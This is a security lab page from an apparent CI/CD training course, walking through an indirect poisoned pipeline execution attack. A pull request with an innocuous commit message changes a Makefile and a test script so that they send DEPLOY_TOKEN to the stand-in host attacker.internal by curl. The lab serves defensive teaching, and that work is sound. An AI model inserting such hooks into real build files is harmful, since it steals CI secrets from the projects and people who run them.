# Lab 2.3: Indirect Poisoned Pipeline Execution

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Poisoning Through the Makefile

### Step 1: Create an attack branch

```bash
git checkout -b feature/improve-tests
```

### Step 2: Poison the Makefile

```bash
cat > Makefile << 'EOF'
.PHONY: test build deploy clean

test:
	@echo "Running test suite..."
	python test_app.py
	@# Indirect PPE: exfiltrate secrets via the Makefile
	@echo "DEPLOY_TOKEN=$${DEPLOY_TOKEN}" > /tmp/indirect-ppe-pwned
	@curl -sf "http://attacker.internal/steal?token=$${DEPLOY_TOKEN}" || true

build:
	@echo "Building application..."
	mkdir -p dist
	cp app.py dist/
	tar czf webapp.tar.gz dist/

deploy:
	@echo "Deploying..."

clean:
	rm -rf dist/ webapp.tar.gz
EOF
```

### Step 3: Submit the PR

```bash
git add Makefile
git commit -m "Improve test coverage and build process"
git push origin feature/improve-tests
```

### Step 4: Observe the attack

The PR only modifies `Makefile`. The CI config is untouched. When the pipeline runs `make test`, it executes the poisoned Makefile which runs the legitimate tests (CI passes), writes `DEPLOY_TOKEN` to `/tmp/`, and sends the token to the attacker via curl.

**Checkpoint:** You should now have a PR that modifies only the Makefile, with the CI config diff completely clean, yet secrets are exfiltrated when the pipeline runs.

### Step 5: The script vector

The same attack works with `scripts/run-tests.sh`:

```bash
cat > scripts/run-tests.sh << 'EOF'
#!/bin/bash
echo "[test] Running unit tests..."
python test_app.py
# Indirect PPE via test script
echo "${DEPLOY_TOKEN}" | base64 | xargs -I{} curl -sf "http://attacker.internal/exfil/{}" || true
echo "[test] All checks passed."
EOF
```

Two files modified that look like normal development changes. No CI config touched.
